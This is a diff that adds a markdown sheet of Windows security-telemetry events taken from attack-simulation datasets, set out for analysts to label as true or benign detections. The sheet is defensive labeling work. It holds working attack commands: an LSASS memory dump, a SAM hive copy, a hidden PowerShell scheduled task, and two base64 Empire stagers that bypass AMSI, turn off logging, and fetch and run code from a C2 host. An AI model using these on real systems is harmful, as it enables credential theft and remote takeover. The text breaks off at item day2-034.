@@ -1,0 +1,123 @@
+# Day 2 labeling candidates — 40 items
+
+Read each one and independently decide: `true_positive`, `benign_noisy`, or `needs_review`. Don't look at each other's answer first.
+
+## day2-001  (source: psh_powershell_httplistener.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\Explorer.EXE | reg_key=HKU\S-1-5-21-3940915590-64593676-1414006259-500\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count\{1NP14R77-02R7-4R5Q-O744-2RO1NR5198O7}\JvaqbjfCbjreFuryy\i1.0\cbjrefuryy.rkr | reg_value=Binary Data
+
+## day2-002  (source: empire_launcher_vbs.zip)
+host=MORDORDC.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe | net=0:0:0:0:0:0:0:1->0:0:0:0:0:0:0:1:389
+
+## day2-003  (source: psh_lsass_memory_dump_comsvcs.zip)
+host=WORKSTATION5 | user=WORKSTATION5\wardog | image=C:\Windows\System32\rundll32.exe | cmd='"C:\\Windows\\System32\\rundll32.exe" C:\\windows\\System32\\comsvcs.dll MiniDump 756 C:\\Users\\wardog\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full'
+
+## day2-004  (source: cmd_sam_copy_esentutl.zip)
+host=WORKSTATION5 | user=WORKSTATION5\wardog | image=C:\Windows\System32\esentutl.exe | cmd='esentutl.exe  /y /vss C:\\windows/system32/config/SAM /d C:\\ProgramData\\SAM'
+
+## day2-005  (source: psh_mshta_html_application_execution.zip)
+host=WORKSTATION5 | user=WORKSTATION5\wardog | image=C:\Windows\System32\mshta.exe | cmd='"C:\\windows\\system32\\mshta.exe" "C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"'
+
+## day2-006  (source: reg_disable_eventlog_service_startuptype_modification_via_registry.zip)
+host=Pedro01 | user=PEDRO01\pedro | image=C:\Users\IT01-Pedro\Downloads\payload.exe | reg_key=HKLM\System\CurrentControlSet\Services\EventLog\Start | reg_value=DWORD (0x00000004)
+
+## day2-007  (source: empire_persistence_registry_modification_run_keys_standard_user.zip)
+host=WORKSTATION6.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\system32\lsass.exe | reg_key=HKLM\System\CurrentControlSet\Services\W32Time\SecureTimeLimits\SecureTimeHigh | reg_value=QWORD (0x01d68292-0x3f2eebc3)
+
+## day2-008  (source: empire_schtasks_creation_standard_user.zip)
+host=WORKSTATION5.theshire.local | user=THESHIRE\pgustavo | image=C:\Windows\System32\schtasks.exe | cmd='"C:\\windows\\system32\\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\""'
+
+## day2-009  (source: empire_shell_net_localgroup_administrators.zip)
+host=WORKSTATION5.theshire.local | user=THESHIRE\pgustavo | image=C:\Windows\System32\net.exe | cmd='"C:\\windows\\system32\\net.exe" localgroup Administrators'
+
+## day2-010  (source: empire_uac_shellapi_fodhelper.zip)
+host=WORKSTATION5.theshire.local | user=THESHIRE\pgustavo | image=C:\Windows\System32\whoami.exe | cmd='"C:\\windows\\system32\\whoami.exe" /groups'
+
+## day2-011  (source: psh_powershell_httplistener.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\System32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime | reg_value=QWORD (0x01d6b0f8-0x5c400ebe)
+
+## day2-012  (source: empire_launcher_vbs.zip)
+host=MORDORDC.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\Windows\System32\lsass.exe | net=0:0:0:0:0:0:0:1->0:0:0:0:0:0:0:1:389
+
+## day2-013  (source: empire_launcher_vbs.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\Explorer.EXE | reg_key=HKU\S-1-5-21-2079883792-3656946353-945924832-1104\Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts\VBSFile_.vbs | reg_value=DWORD (0x00000000)
+
+## day2-014  (source: empire_launcher_vbs.zip)
+host=WORKSTATION5.theshire.local | user=THESHIRE\pgustavo | image=C:\Windows\System32\wscript.exe | cmd='"C:\\windows\\System32\\WScript.exe" "C:\\Users\\pgustavo\\Desktop\\launcher.vbs" '
+
+## day2-015  (source: psh_lsass_memory_dump_comsvcs.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\Explorer.EXE | reg_key=HKU\S-1-5-21-3940915590-64593676-1414006259-500\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count\HRZR_PGYFRFFVBA | reg_value=Binary Data
+
+## day2-016  (source: psh_lsass_memory_dump_comsvcs.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\system32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475 | reg_value=Binary Data
+
+## day2-017  (source: psh_lsass_memory_dump_comsvcs.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\System32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime | reg_value=QWORD (0x01d6a5a9-0x64046265)
+
+## day2-018  (source: cmd_sam_copy_esentutl.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\System32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime | reg_value=QWORD (0x01d6a5d0-0x5dd5455c)
+
+## day2-019  (source: cmd_sam_copy_esentutl.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\system32\svchost.exe | reg_key=\REGISTRY\A\{0ef83136-a15f-19d2-f40d-136b8d419f95}\Root\InventoryDriverPackage\WritePermissionsCheck | reg_value=DWORD (0x00000001)
+
+## day2-020  (source: cmd_sam_copy_esentutl.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\Explorer.EXE | reg_key=HKU\S-1-5-21-3940915590-64593676-1414006259-500\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count\HRZR_PGYFRFFVBA | reg_value=Binary Data
+
+## day2-021  (source: psh_mshta_html_application_execution.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\Explorer.EXE | reg_key=HKU\S-1-5-21-3940915590-64593676-1414006259-500\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count\{1NP14R77-02R7-4R5Q-O744-2RO1NR5198O7}\JvaqbjfCbjreFuryy\i1.0\cbjrefuryy.rkr | reg_value=Binary Data
+
+## day2-022  (source: psh_mshta_html_application_execution.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\system32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{E4AEB720-7F18-419F-A20E-6E0B5C4ED968}\DynamicInfo | reg_value=Binary Data
+
+## day2-023  (source: psh_mshta_html_application_execution.zip)
+host=WORKSTATION5 | user=None | image=C:\windows\system32\SecurityHealthService.exe | reg_key=HKU\S-1-5-21-3940915590-64593676-1414006259-500\Software\Microsoft\Windows Defender Security Center\Account protection\AccountProtection_MicrosoftAccount_Verified | reg_value=DWORD (0x00000000)
+
+## day2-024  (source: reg_disable_eventlog_service_startuptype_modification_via_registry.zip)
+host=Pedro01 | user=PEDRO01\IT01-Pedro | image=C:\Windows\Explorer.EXE | reg_key=HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched\Microsoft.Windows.Explorer | reg_value=DWORD (0x0000000b)
+
+## day2-025  (source: reg_disable_eventlog_service_startuptype_modification_via_registry.zip)
+host=Pedro01 | user=PEDRO01\IT01-Pedro | image=C:\Windows\System32\smartscreen.exe | cmd='C:\\Windows\\System32\\smartscreen.exe -Embedding'
+
+## day2-026  (source: reg_disable_eventlog_service_startuptype_modification_via_registry.zip)
+host=Pedro01 | user=NT AUTHORITY\SYSTEM | image=C:\Windows\system32\svchost.exe | reg_key=HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\IdentityCRL\ExtendedProperties\LID | reg_value=00180009508D358C
+
+## day2-027  (source: empire_persistence_registry_modification_run_keys_standard_user.zip)
+host=MORDORDC.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\Windows\System32\wbem\WmiPrvSE.exe | cmd='C:\\windows\\system32\\wbem\\wmiprvse.exe -Embedding'
+
+## day2-028  (source: empire_persistence_registry_modification_run_keys_standard_user.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe | reg_key=HKU\S-1-5-21-3125456671-949036322-3048627137-1104\Software\Microsoft\Windows\CurrentVersion\Debug | reg_value=SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+
+## day2-029  (source: empire_persistence_registry_modification_run_keys_standard_user.zip)
+host=MORDORDC.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\system32\wbem\wmiprvse.exe | reg_key=HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass | reg_value=DWORD (0x00000001)
+
+## day2-030  (source: empire_schtasks_creation_standard_user.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe | reg_key=HKU\S-1-5-21-4228717743-1032521047-1810997296-1104\Software\Microsoft\Windows\CurrentVersion\debug | reg_value=SQBGACgAJABQAFMAVgBlAHIAUwBJAE8ATgBUAEEAYgBsAGUALgBQAFMAVgBFAHIAUwBpAG8AbgAuAE0AYQBKAG8AUgAgAC0AZwBFACAAMwApAHsAJAA0ADMAZABlADIAPQBbAFIARQBGAF0ALgBBAHMAUwBFAG0AYgBsAHkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyACkAewAkADcAMQAyAEQAYgA9ACQANAAzAEQARQAyAC4ARwBFAHQAVgBhAGwAdQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkADcAMQAyAGQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAEQAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBkAGIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBPAEwATABFAEMAVABpAG8AbgBTAC4ARwBlAG4AZQBSAGkAYwAuAEQASQBjAFQAaQBPAE4AQQBSAHkAWwBTAHQAcgBJAG4AZwAsAFMAeQBTAHQARQBtAC4ATwBiAEoARQBjAHQAXQBdADoAOgBOAGUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBMAH0ARQBMAFMARQB7AFsAUwBDAHIASQBwAFQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYASQBlAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AdQBMAGwALAAoAE4ARQBXAC0ATwBCAGoARQBDAHQAIABDAG8AbABMAEUAQwBUAEkATwBuAFMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMAaABTAGUAdABbAHMAVABSAEkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcAZQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIARQBmAC4ARwBFAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEATAB1AEUAKAAkAG4AdQBMAEwALAAkAHQAUgB1AEUAKQA7AH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAFQALgBTAGUAcgBWAEkAYwBlAFAATwBJAG4AdABNAGEATgBBAEcARQByAF0AOgA6AEUAeABQAEUAYwBUADEAMAAwAEMAbwBuAFQAaQBuAFUAZQA9ADAAOwAkADgAZgA1AGIAOQA9AE4ARQBXAC0ATwBCAGoARQBDAHQAIABTAFkAcwBUAEUAbQAuAE4AZQBUAC4AVwBFAGIAQwBMAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AQwBPAGQAaQBuAEcAXQA6ADoAVQBuAEkAYwBPAGQARQAuAEcARQBUAFMAVABSAEkAbgBHACgAWwBDAG8AbgBWAEUAcgB0AF0AOgA6AEYAcgBvAE0AQgBhAFMARQA2ADQAUwB0AHIASQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA4AEYANQBCADkALgBIAEUAQQBEAEUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA4AGYANQBCADkALgBQAFIAbwBYAFkAPQBbAFMAeQBTAFQAZQBNAC4ATgBlAFQALgBXAEUAYgBSAEUAcQBVAEUAcwBUAF0AOgA6AEQARQBGAGEAdQBMAFQAVwBlAGIAUABSAE8AeABZADsAJAA4AGYANQBiADkALgBQAHIAbwBYAFkALgBDAFIAZQBkAEUAbgB0AGkAQQBsAFMAIAA9ACAAWwBTAFkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABlAG4AdABpAGEATABDAGEAQwBIAEUAXQA6ADoARABFAGYAYQBVAGwAdABOAEUAVABXAE8AcgBrAEMAcgBFAGQAZQBuAHQAaQBBAEwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA4AGYANQBiADkALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABJAE4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAdABlAFMAKAAnADAAXQByAFgAMwBZADQAOgAoACkASgBjAGgAQQBLAGsAUgA3AFYAZwArAFsALwBVAHAAOQAyAHQAbQBHAFEAdgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADgARgA1AGIAOQAuAEgARQBBAGQAZQBSAFMALgBBAEQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAdQBvAFMAVwBvAGgAbgBsAEMAWQBsAGYAPQAyAE8AVQBBADcAUQBqAG0ATQB0AGgAaQBzAFUAUAA5AFQANwBtAHoAdgBKAEwAbgAzAFcANAA9ACIAKQA7ACQARABhAFQAQQA9ACQAOABmADUAYgA5AC4ARABPAFcATgBMAE8AYQBEAEQAYQB0AGEAKAAkAHMARQByACsAJABUACkAOwAkAEkAdgA9ACQARABBAHQAQQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAFQAQQBbADQALgAuACQAZABBAHQAQQAuAEwARQBuAEcAVABIAF0AOwAtAGoAbwBJAE4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABhAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+
+## day2-031  (source: empire_schtasks_creation_standard_user.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\system32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MordorSchtask\SD | reg_value=Binary Data
+
+## day2-032  (source: empire_schtasks_creation_standard_user.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\System32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime | reg_value=QWORD (0x01d68fe7-0x0ea685cf)
+
+## day2-033  (source: empire_shell_net_localgroup_administrators.zip)
+host=WORKSTATION5.theshire.local | user=THESHIRE\pgustavo | image=C:\Windows\System32\net1.exe | cmd='C:\\windows\\system32\\net1 localgroup Administrators'
+
+## day2-034  (source: empire_shell_net_localgroup_administrators.zip)
